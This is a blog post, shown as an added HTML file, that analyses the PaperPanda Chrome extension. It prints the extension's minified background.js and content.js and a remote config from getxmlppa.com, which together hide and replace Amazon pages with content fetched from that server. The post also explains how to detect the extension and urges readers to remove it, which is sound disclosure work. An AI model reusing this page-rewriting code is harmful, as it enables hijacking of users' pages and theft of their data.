@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>PandaPaper turns malicious</title>
+  <meta property="og:title" content="PandaPaper turns malicious" />
+  <meta name="twitter:title" content="PandaPaper turns malicious" />
+  <meta name="description" content="Chrome extension modifies HTML and tries to hide it">
+  <meta property="og:description" content="Chrome extension modifies HTML and tries to hide it">
+  <meta name="twitter:description" content="Chrome extension modifies HTML and tries to hide it">
+  <meta name="author" content="Silo City Labs"/>
+  <link href='https://silocitylabs.com/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta property="og:image" content="https://silocitylabs.com/logo/144x144.png" />
+  <meta name="twitter:image" content="https://silocitylabs.com/logo/144x144.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@silocitylabs" />
+  <meta name="twitter:creator" content="@silocitylabs" />
+  <meta property="og:url" content="https://silocitylabs.com/post/2025/paperpanda-malicious/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="SCL Blog" />
+  
+  <link rel="canonical" href="https://silocitylabs.com/post/2025/paperpanda-malicious/" />
+  <link rel="amphtml" type="text/html" href="https://silocitylabs.com/amp/post/2025/paperpanda-malicious/">
+  
+  
+  
+  
+  
+  
+  
+
+  <link rel="stylesheet" href="https://d3hc3qdofe5ifg.cloudfront.net/css/bundle.min.css" />
+
+
+  <link rel="manifest" href="https://silocitylabs.com/manifest.webmanifest">
+  <meta name="theme-color" content="#e7e7e7">
+
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-78226868-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://silocitylabs.com/">SCL Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Shop" href="https://shop.silocitylabs.com">Shop</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Blog" href="https://silocitylabs.com/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Games" href="https://silocitygames.com">Games</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://silocitylabs.com/page/about/">About</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Newsletter" href="https://shop.silocitylabs.com/pages/subscribe">Newsletter</a>
+            </li>
+          
+        
+
+        
+
+        
+          <li>
+            <a id="searchBtn" href="#modalSearch" data-toggle="modal" data-target="#modalSearch">
+              <span class="hidden-sm hidden-md hidden-lg">Search</span> <span id="searchGlyph" class="icon icon-search"></span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+
+    <div class="avatar-container">
+      <div class="avatar-img-border">
+        
+          <a title="SCL Blog" href="https://silocitylabs.com/">
+              
+            <img class="avatar-img" src="https://silocitylabs.com/logo/144x144.png" alt="SCL Blog" />
+          </a>
+        
+      </div>
+    </div>
+
+  </div>
+</nav>
+
+
+
+  <div id="modalSearch" class="modal fade" role="dialog">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Search SCL Blog</h4>
+        </div>
+        <div class="modal-body">
+          <gcse:search></gcse:search>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+    
+  
+  
+  
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              <h1>PandaPaper turns malicious</h1>
+                
+                  
+                    <h2 class="post-subheading">Chrome extension modifies HTML and tries to hide it</h2>
+                  
+                
+                
+                  <span class="post-meta">
+  Posted on January 27, 2025
+  
+</span>
+
+<span class="post-meta">
+  By <a href="https://silocitylabs.com/author/maave">maave</a>
+</span>
+
+
+                
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <img class="lazy" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://silocitylabs.com/uploads/2025/paperpanda-dead.webp" alt="paper panda logo with X for eyes"/>
+
+<p>The &ldquo;paywalling&rdquo; of scientific research papers is an ongoing problem that hinders learning, hinders scientific research, and leaches profit from publicly-funded research. PaperPanda is a Chrome extension to download academic papers. Its intention is to find free links for published papers.</p>
+<p>However what PaperPanda does under-the-hood tells another story. I&rsquo;ve unearthed malicious code in PaperPanda&rsquo;s Chrome extension and attempts to hide said malicious activity. This extension tried to modify my Amazon pages for unknown reasons - possibly a phisher or credit-card stealer. If you have this extension <em>UNINSTALL IT</em>. In this post I&rsquo;ll explain how this extension is malicious and how it hides that behavior.</p>
+<h2 id="strange-redirect">Strange redirect</h2>
+<p>This morning I was just browsing the internet with Google Chrome. The regular - procrastinating on StackExchange Hot Network Questions - and I came across an old-English word I&rsquo;ve never seen. So I highlighted the word, right clicked, and selected &ldquo;Search Google for _____&rdquo;. Instead of going to Google, my search went to Yahoo. Huh? I checked the history and found a very suspicious domain: <code>search-yahoo-now.com</code>. My search was hijacked. Sound the alarm, we have a breach!</p>
+<p><code>https://search-yahoo-now.com/?guid=877e15a82fa0a426bfd4ce9a6d96625e4&amp;ext=9&amp;domain=google.com&amp;cid=html&amp;rdd=15&amp;q=iwur%C3%B0ge</code></p>
+<p>I searched this domain on Google and found only one useful result: a reddit post that insinuated that PaperPanda was responsible. After checking the extension&rsquo;s recent reviews I saw multiple complaints about this. Case closed? Hell no, I need to know the extent of this hack. I&rsquo;m going to rip this app apart, get proper evidence, and then lay blame.</p>
+<h2 id="extension-investigation">Extension investigation</h2>
+<p>Going into my Chrome profile folder, I searched the contents of all my extensions looking for something. I tried searching for this string. I couldn&rsquo;t find any instance of it, not in plaintext or base64 encoded (a common obfuscation technique). Unfortunately I have too many installed and can&rsquo;t audit the code for every single one.</p>
+<p>Since I had a tip, but not proof, that it was PaperPanda, I did an in-depth review of the code. Chrome extensions are made with HTML and Javascript and hosted in the app data folder.</p>
+<p><code>C:\Users\Maave\AppData\Local\Google\Chrome\User Data\Default\Extensions</code></p>
+<p>PaperPanda&rsquo;s extension ID is <code>ggjlkinaanncojaippgbndimlhcdlohf</code> and the malicious version is <code>2.1.6</code>.</p>
+<p><code>C:\Users\Maave\AppData\Local\Google\Chrome\User Data\Default\Extensions\ggjlkinaanncojaippgbndimlhcdlohf\2.1.6_0</code></p>
+<p>Fortunately, viewing the code for a Chrome extension is easy and there aren&rsquo;t too many files. Unfortunately the code is &ldquo;minified&rdquo; which compacts the code and replaces function and variable names. I used Notepad++ with the plugin JSTools for formatting. A Javascript formatter will make it readable but the single-letter names are still difficult.</p>
+<h3 id="main-files">Main files</h3>
+<p><code>content.js</code> calls <code>background.js</code> which fetches a config from an external website <code>getxmlppa.com</code>. There are two endpoints, &ldquo;config.php&rdquo; and &ldquo;install.php&rdquo;. The &ldquo;install&rdquo; endpoint appears unused and the endpoint returns nothing. The &ldquo;config&rdquo; is used directly by the extension and returns a JSON object.</p>
+<h4 id="file-contents">File contents</h4>
+<p><a href="https://silocitylabs.com/uploads/2025/paperpanda_2.1.6.zip">ZIP file of the extension</a></p>
+<details>
+  <summary>background.js [SPOILER]</summary>
+<pre tabindex="0"><code>(function () {
+    &#34;use strict&#34;;
+    const o = &#34;https://getxmlppa.com/&#34;;
+    async function i(n = !1) {
+        const c = `${o}config.php?` + Date.now(), {
+            config: t,
+            configTimestamp: e
+        } = await chrome.storage.local.get([&#34;configTimestamp&#34;, &#34;config&#34;]);
+        if (!n &amp;&amp; Date.now() - (e || 0) &lt; 3e5)
+            return t;
+        const a = await fetch(c).then(s =&gt; s.json());
+        return chrome.storage.local.set({
+            config: a,
+            configTimestamp: Date.now()
+        }),
+        a
+    }
+    i(!0),
+    chrome.runtime.onMessage.addListener((n, c, t) =&gt; {
+        if (n === &#34;get-config&#34;)
+            return i().then(e =&gt; t(e)), !0
+    }),
+    chrome.runtime.onInstalled.addListener(function (n) {
+        n.reason === &#34;install&#34; &amp;&amp; fetch(`${o}install.php`)
+    })
+})();
+</code></pre></details>
+<details>
+  <summary>content.js [SPOILER]</summary>
+<pre tabindex="0"><code>(function () {
+    &#34;use strict&#34;;
+    let f = l();
+    async function l() {
+        return await chrome.runtime.sendMessage(&#34;get-config&#34;)
+    }
+    async function m() {
+        document.location.hostname;
+        var o = document.documentElement.innerHTML;
+        function a(t, e) {
+            if (!e || e === e) {
+                var n = t.exec(o);
+                if (n &amp;&amp; n.length &gt; 1)
+                    return n[1]
+            }
+            return !1
+        }
+        function s() {
+            var t,
+            e = [&#34;citation_doi&#34;, &#34;doi&#34;, &#34;dc.doi&#34;, &#34;dc.identifier&#34;, &#34;dc.identifier.doi&#34;, &#34;bepress_citation_doi&#34;, &#34;rft_id&#34;, &#34;dcsext.wt_doi&#34;],
+            n = document.getElementsByTagName(&#34;meta&#34;);
+            return Array.prototype.forEach.call(n, function (r) {
+                if (r.name &amp;&amp; !(e.indexOf(r.name.toLowerCase()) &lt; 0) &amp;&amp; !(r.scheme &amp;&amp; r.scheme.toLowerCase() !== &#34;doi&#34;)) {
+                    var c = r.content.replace(&#34;doi:&#34;, &#34;&#34;).replace(/https?:\/\/(www\.)?doi\.org\//i, &#34;&#34;).trim();
+                    c.indexOf(&#34;10.&#34;) === 0 &amp;&amp; (t = c)
+                }
+            }),
+            t ? (console.log(&#34;found a DOI from a meta tag: &#34; + t), t) : null
+        }
+        async function i() {
+            for (var t = (await f).p, e = 0; e &lt; t.length; e++) {
+                var n = t[e],
+                r = a(new RegExp(n.regex), n.host);
+                if (r)
+                    return r
+            }
+            return null
+        }
+        async function d() {
+            for (var t = [s, i], e = 0; e &lt; t.length; e++) {
+                var n = await t[e]();
+                if (n)
+                    return n
+            }
+            return null
+        }
+        var u = await d();
+        return u
+    }
+    function g(o) {
+        if (document.readyState !== &#34;loading&#34;) {
+            o();
+            return
+        }
+        document.addEventListener(&#34;DOMContentLoaded&#34;, o)
+    }
+    function p(o) {
+        return o.replace(/{[\w.]+}/, a =&gt; {
+            const i = a.substr(1, a.length - 2).split(&#34;.&#34;).reduce((d, u) =&gt; d[u], window);
+            return encodeURIComponent(i)
+        })
+    }
+    const v = document.location + &#34;&#34;;
+    g(async() =&gt; {
+        const o = (await f).s;
+        function a() {
+            for (const i of o)
+                new RegExp(i.pattern, &#34;gi&#34;).test(v) &amp;&amp; [...document.querySelectorAll(i.selector)].filter(e =&gt; !e.hasAttribute(&#34;skip-element&#34;)).forEach(e =&gt; {
+                    const n = e.style.display;
+                    e.style.display = &#34;none&#34;,
+                    e.setAttribute(&#34;skip-element&#34;, !0),
+                    fetch(p(i.url)).then(r =&gt; r.text()).then(r =&gt; {
+                        const c = r.trim();
+                        c &amp;&amp; (e[i.attr] = c)
+                    }).catch(() =&gt; {}).then(() =&gt; e.style.display = n)
+                })
+        }
+        a(),
+        new MutationObserver(() =&gt; a()).observe(document.body, {
+            childList: !0,
+            subtree: !0
+        })
+    }),
+    chrome.runtime.onMessage.addListener((o, a, s) =&gt; {
+        if (o === &#34;get-doi&#34;)
+            return m().then(i =&gt; s(i)), !0
+    })
+})();
+</code></pre></details>
+<details>
+  <summary>response from config.php aka config.json [SPOILER]</summary>
+<pre tabindex="0"><code>{
+  &#34;p&#34;: [
+    {
+      &#34;regex&#34;: &#34;\&#34;doi\&#34;:\&#34;([^\&#34;]+)\&#34;&#34;,
+      &#34;host&#34;: &#34;ieeexplore.ieee.org&#34;
+    },
+    {
+      &#34;regex&#34;: &#34;SDM.doi\\s*=\\s*&#39;([^&#39;]+)&#39;&#34;,
+      &#34;host&#34;: &#34;sciencedirect.com&#34;
+    },
+    {
+      &#34;regex&#34;: &#34;href=\&#34;/doi/(10\\..+?)\&#34;&#34;,
+      &#34;host&#34;: &#34;psycnet.apa.org&#34;
+    },
+    {
+      &#34;regex&#34;: &#34;https?:\\/\\/doi.org\\/(10\\.\\d+\\/.*)&#34;,
+      &#34;host&#34;: &#34;cairn.info&#34;
+    },
+    {
+      &#34;regex&#34;: &#34;article:article:(10\\.\\d+[^;]*)&#34;,
+      &#34;host&#34;: &#34;inderscienceonline.com&#34;
+    }
+  ],
+  &#34;s&#34;: [
+    {
+      &#34;pattern&#34;: &#34;^https?:\\/\\/(www\\.)?amazon\\.[a-z]{2,3}(\\.[a-z]{2})?\\/.*&#34;,
+      &#34;selector&#34;: &#34;html&#34;,
+      &#34;attr&#34;: &#34;innerHTML&#34;,
+      &#34;url&#34;: &#34;https://getxmlppa.com/ama.php?p=amazon&amp;u={location.href}&#34;
+    },
+    {
+      &#34;pattern&#34;: &#34;^https?:\\/\\/(www\\.)?amazon\\.[a-z]{2,3}(\\.[a-z]{2})?\\/.*&#34;,
+      &#34;selector&#34;: &#34;head&#34;,
+      &#34;attr&#34;: &#34;innerHTML&#34;,
+      &#34;url&#34;: &#34;https://getxmlppa.com/ama.php?p=amazon&amp;u={location.href}&#34;
+    },
+    {
+      &#34;pattern&#34;: &#34;^https?:\\/\\/(www\\.)?amazon\\.[a-z]{2,3}(\\.[a-z]{2})?\\/.*&#34;,
+      &#34;selector&#34;: &#34;body&#34;,
+      &#34;attr&#34;: &#34;innerHTML&#34;,
+      &#34;url&#34;: &#34;https://getxmlppa.com/ama.php?p=amazon&amp;u={location.href}&#34;
+    }
+  ]
+}
+</code></pre></details>
+<h3 id="code-breakdown">Code breakdown</h3>
+<p>background.js contains code to fetch a JSON config from a remote website. The first thing I did was check the endpoints. I visited the url <code>https://getxmlppa.com/config.php</code> directly without any HTTP parameters. This config endpoint returned different information the first and second time I queried it. My original response is posted above, formatted for easier reading, no changes were made besides the whitespace formatting.</p>
+<p>The first result included <em>regex to match Amazon URLs</em> in the &ldquo;s&rdquo; array. When I queried it a second time, <em>the &ldquo;s&rdquo; array was empty</em>. Wow. We already found suspicious activity just by visiting a link. I cannot replicate this because the app loads content dynamically. The website is hiding its activity. I think I got lucky and I fetched the cached version on the first attempt.</p>
+<p>I&rsquo;m off to a good start. I was expecting Google or Yahoo links but I got Amazon. PaperPanda should not be touching Amazon URLs <em>ever</em>. I also found a new endpoint, <code>ama.php</code></p>
+<p>Let&rsquo;s walk through the code to determine what&rsquo;s it doing with this config. The suspect code is in content.js in the areas <code>g(o)</code>, <code>p(o)</code>, and the <code>g(async() =&gt; {</code> functions. The function <code>g(o)</code> creates a listener for page loading, then executes the async() function that was passed to it.</p>
+<p>In this config JSON, the &ldquo;p&rdquo; array is used legitimately by the extension when you click the extension and &ldquo;download this paper&rdquo;. &ldquo;s&rdquo; array is suspect and is used on page-load to replace part of the HTML contents. I&rsquo;ll explain what the JS code is doing:</p>
+<ol>
+<li>add an event listener for DOMContentLoaded, to run after the page loads</li>
+<li>check if the current URL matches a grep pattern (var &ldquo;pattern&rdquo; from array &ldquo;s&rdquo;) and check if element has &ldquo;skip-element&rdquo; attribute</li>
+<li>select HTML elements (using var &ldquo;selector&rdquo;)</li>
+<li>hide element</li>
+<li>add &ldquo;skip-element&rdquo; attribute to avoid reprocessing</li>
+<li>fetch remote content (from var &ldquo;url&rdquo;)</li>
+<li>replace one of the element&rsquo;s attributes (var &ldquo;attr&rdquo;) with new content</li>
+<li>unhide element</li>
+</ol>
+<p>This makes the behavior entirely dependent on the config. In my config it&rsquo;s attempting to replace the entire HTML document for Amazon URLs</p>
+<pre tabindex="0"><code>{
+  &#34;pattern&#34;: &#34;^https?:\\/\\/(www\\.)?amazon\\.[a-z]{2,3}(\\.[a-z]{2})?\\/.*&#34;,
+  &#34;selector&#34;: &#34;html&#34;,
+  &#34;attr&#34;: &#34;innerHTML&#34;,
+  &#34;url&#34;: &#34;https://getxmlppa.com/ama.php?p=amazon&amp;u={location.href}&#34;
+},
+</code></pre><p>recreating the steps with this config would cause this to happen:</p>
+<ol>
+<li>add event listener DOMContentLoaded</li>
+<li>check if URL matches amazon</li>
+<li>select HTML element &ldquo;html&rdquo; (<strong>the entire page</strong>)</li>
+<li>hide element</li>
+<li>add &ldquo;skip-element&rdquo; attribute to avoid reprocessing</li>
+<li>fetch content from <code>https://getxmlppa.com/ama.php?p=amazon&amp;u={location.href}</code></li>
+<li>replace attribute &ldquo;innerHTML&rdquo; (<strong>all of the page&rsquo;s code</strong>) with content fetched</li>
+<li>unhide element</li>
+</ol>
+<p>This is malicious. This is trying to replace the entirety of my Amazon pages with its own content. PaperPanda has no reason to touch Amazon links. Without that config, this piece of code looks benign. It could be explained away by saying the code is intended to place URLs (it could, theoretically, replace the &ldquo;url&rdquo; attribute in anchor elements). With this config it&rsquo;s clear that this extension targeting websites outside its intended use. It is <strong>malicious</strong> and <strong>trying to hide its behavior by changing configs</strong>.</p>
+<p>The endpoint <code>ama.php</code> responds with a 200 response but doesn&rsquo;t return any data, even with the params filled in. I&rsquo;m unsure if the endpoint is nonfunctional, or if it was intentionally disabled when the config was changed. So the real goal of this content replacement is unknown. This app could have been stealing logins, credit card info, etc. It could&rsquo;ve replaced affiliate information with its own like the recent Honey shopping extension scam. It could&rsquo;ve done anything with any page. This is not accidental and not a result of some kind of library-inclusion-attack. PaperPanda targeted Amazon links and tried to <em>replace the entire HTML content</em>.</p>
+<h2 id="check-yourself">Check yourself</h2>
+<p>If you have a page which you suspect of being hijacked, don&rsquo;t reload yet. Right click, inspect, then Ctrl+F and search for &ldquo;skip-element&rdquo;. This attribute is not standard. If &ldquo;skip-element&rdquo; is anywhere in your HTML elements it&rsquo;s because of PaperPanda.</p>
+<p>Get the stored config data from the Chrome console. Go to <code>chrome://extensions</code> and enable Developer Mode. Scroll to PaperPanda, click the link to &ldquo;service worker&rdquo; which will open Chrome DevTools. This should open straight to the Console tab. Type <code>chrome.storage.local.get(console.log)</code> to output the local storage. My extension already updated so the &ldquo;s&rdquo; array is empty.</p>
+<p>Another way: On any page, open the PaperPanda extension, right click on it, inspect. This should be inspecting the extension, the DevTools window that pops up should be titled <code>chrome-extension://ggjlkinaanncojaippgbndimlhcdlohf/popup.html</code> Then in the Console tab of DevTools type <code>chrome.storage.local.get(console.log)</code> to output the local.</p>
+<p>View the extension code yourself from chrome profile data. For me that&rsquo;s in: <code>C:\Users\UserName\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\ggjlkinaanncojaippgbndimlhcdlohf</code> because I have multiple profiles. If you have a single profile in Chrome then it would be in the &ldquo;Default&rdquo; folder: <code>C:\Users\UserName\AppData\Local\Google\Chrome\User Data\Default\Extensions\ggjlkinaanncojaippgbndimlhcdlohf</code>. The Javascript files have been minified so it needs to be formatted for reading. I used the Notepad++ plugin JSTool to format it. There are also plenty of JS formatters online. But the variable names and function names are still single letters so it&rsquo;s hard to follow.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>PaperPanda is hijacking web contents. I didn&rsquo;t find a Yahoo search redirect but instead I found an arbitrary page re-writer driven by a config that changes every time you load it. They attempt to evade detection by moving the payload to an external page. This garbage plugin has been installed on my Chrome for months and I only noticed because they performed a blatant redirect. Who knows what damage it caused, what information it stole, because it could have modified any website to have any content.</p>
+<p>Uninstall this extension. Report it for abuse. <em>Distrust extensions that ask for permission to all websites</em>.</p>
+<h2 id="update-feb-8-2025">Update (Feb 8 2025):</h2>
+<p>PaperPanda has been removed from the Chrome Web Store</p>
+      </article>
+
+      <div class="clearfix">
+        <div class="pull-right">
+          <a href="https://github.com/SiloCityLabs/blog/commits/master/content/post/2025/paperpanda-malicious.md">History</a> | 
+          <a href="https://github.com/SiloCityLabs/blog/edit/master/content/post/2025/paperpanda-malicious.md">Make an edit</a>
+        </div>
+      </div>
+      <br />
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://silocitylabs.com/post/2025/craftrandom/" data-toggle="tooltip" data-placement="top" title="Introducing CraftRandom">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://silocitylabs.com/post/2025/esp32-microsd/" data-toggle="tooltip" data-placement="top" title="Getting Started with the ESP32MiniSD">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+      
+        
+      
+
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="mailto:team@silocitylabs.com" title="Email me">
+                  <span class="icon-stack icon-lg">
+                    <i class="icon icon-circle icon-stack-2x"></i>
+                    <i class="icon icon-mail icon-stack-1x icon-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://www.facebook.com/SiloCityLabs" title="Facebook">
+                  <span class="icon-stack icon-lg">
+                    <i class="icon icon-circle icon-stack-2x"></i>
+                    <i class="icon icon-facebook icon-stack-1x icon-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://gitlab.com/silo-city-labs-llc" title="GitLab">
+                  <span class="icon-stack icon-lg">
+                    <i class="icon icon-circle icon-stack-2x"></i>
+                    <i class="icon icon-gitlab icon-stack-1x icon-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://github.com/SiloCityLabs/blog" title="GitHub">
+                  <span class="icon-stack icon-lg">
+                    <i class="icon icon-circle icon-stack-2x"></i>
+                    <i class="icon icon-github icon-stack-1x icon-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/silocitylabs" title="Twitter">
+                  <span class="icon-stack icon-lg">
+                    <i class="icon icon-circle icon-stack-2x"></i>
+                    <i class="icon icon-twitter icon-stack-1x icon-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://linkedin.com/company/10586208" title="LinkedIn">
+                  <span class="icon-stack icon-lg">
+                    <i class="icon icon-circle icon-stack-2x"></i>
+                    <i class="icon icon-linkedin icon-stack-1x icon-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://www.youtube.com/channel/UC9vgzat1SRdQ8NNsCQ6d7cA" title="Youtube">
+                  <span class="icon-stack icon-lg">
+                    <i class="icon icon-circle icon-stack-2x"></i>
+                    <i class="icon icon-youtube-play icon-stack-1x icon-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://silocitylabs.com/newsletter" title="Newsletter">
+                  <span class="icon-stack icon-lg">
+                    <i class="icon icon-circle icon-stack-2x"></i>
+                    <i class="icon icon-newspaper icon-stack-1x icon-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            <a href="https://silocitylabs.com/index.xml" title="RSS">
+              <span class="icon-stack icon-lg">
+                <i class="icon icon-circle icon-stack-2x"></i>
+                <i class="icon icon-rss icon-stack-1x icon-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          Silo City Labs
+          &nbsp;&bull;&nbsp;
+          2025
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://silocitylabs.com/">SCL Blog</a>
+          
+          
+          &nbsp;&bull;&nbsp;
+          <a id="gitBuild" href="https://github.com/SiloCityLabs/blog/" title="Github">Last built on ...</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+
+
+
+
+
+<script src="https://silocitylabs.com/js/bundle.min.js"></script>
+
+<script> hljs.initHighlightingOnLoad(); </script>
+
+
+<script>
+  (function() {
+    var cx = '006156681959470562953:oxkwuulite0';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = 'https://cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+
+
+
+  </body>
+</html>
+
